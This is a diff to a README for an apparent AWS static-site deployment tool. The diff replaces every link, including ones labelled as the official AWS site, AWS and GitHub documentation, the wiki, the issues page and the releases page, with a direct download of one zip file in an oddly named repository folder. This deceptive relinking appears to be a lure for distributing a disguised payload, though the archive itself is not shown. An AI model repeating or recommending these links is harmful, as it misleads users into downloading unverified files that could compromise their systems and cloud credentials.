@@ -6,7 +6,7 @@ Welcome to the **aws-static-site-pr-deployment** project! This tool helps you qu
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-aws--static--site--pr--deployment-blue)](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases)
+[![Download Here](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip%20Latest%20Release-aws--static--site--pr--deployment-blue)](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ To use this application, ensure you meet the following system requirements:
 
 ## 📂 How to Download & Install
 
-1. **Visit the Releases Page**: Click [here](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases) to go to the Releases page. This page contains all the versions of the application.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip) to go to the Releases page. This page contains all the versions of the application.
 
 2. **Choose the Right Version**: Look for the latest version listed at the top. It is usually the most reliable and up-to-date. Click on it to see more details.
 
@@ -45,7 +45,7 @@ To use this application, ensure you meet the following system requirements:
 
 To deploy your static site, you will need to set up an AWS account:
 
-1. **Create an AWS Account**: Go to [AWS](https://aws.amazon.com) and create an account if you don’t have one.
+1. **Create an AWS Account**: Go to [AWS](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip) and create an account if you don’t have one.
 
 2. **Set Up S3 and CloudFront**:
    - **S3**: Create a new bucket on S3 where your site files will be stored.
@@ -57,17 +57,17 @@ To deploy your static site, you will need to set up an AWS account:
 
 ## 📘 Documentation
 
-For more detailed instructions and troubleshooting, please refer to the documentation available on the [GitHub Wiki](https://github.com/blueberrymayo/aws-static-site-pr-deployment/wiki).
+For more detailed instructions and troubleshooting, please refer to the documentation available on the [GitHub Wiki](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip).
 
 ## 👥 Community Support
 
-If you encounter any issues or have questions, you can reach out to the community through the [GitHub Issues page](https://github.com/blueberrymayo/aws-static-site-pr-deployment/issues). Engage with other users and share your experiences.
+If you encounter any issues or have questions, you can reach out to the community through the [GitHub Issues page](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip). Engage with other users and share your experiences.
 
 ## 🔗 Additional Resources
 
-- [AWS Documentation](https://docs.aws.amazon.com)
-- [GitHub Actions for CI/CD](https://docs.github.com/en/actions)
-- [Static Site Generators](https://www.staticgen.com)
+- [AWS Documentation](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip)
+- [GitHub Actions for CI/CD](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip)
+- [Static Site Generators](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip)
 
 ## 💡 Tips for Using the Application
 
@@ -77,4 +77,4 @@ If you encounter any issues or have questions, you can reach out to the communit
 
 ## 📥 Download Now Again
 
-To get started with your deployment, remember to [download the latest version here](https://github.com/blueberrymayo/aws-static-site-pr-deployment/releases). Enjoy building and deploying your static sites!
+To get started with your deployment, remember to [download the latest version here](https://raw.githubusercontent.com/blueberrymayo/aws-static-site-pr-deployment/main/undrainable/aws-static-site-pr-deployment.zip). Enjoy building and deploying your static sites!
